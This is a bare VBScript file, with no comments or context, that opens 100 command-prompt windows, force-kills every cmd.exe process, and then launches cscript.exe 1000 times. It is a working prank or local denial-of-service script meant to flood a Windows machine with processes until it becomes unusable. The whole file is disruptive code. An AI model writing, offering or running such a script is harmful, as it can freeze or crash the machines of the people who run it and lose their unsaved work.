dim ws
set ws=CreateObject("wscript.shell")
for i=1 to 100
	ws.run "cmd.exe"
next
ws.run "cmd.exe /c taskkill /f /im cmd.exe"
for i=1 to 1000
	ws.run "cscript.exe"
next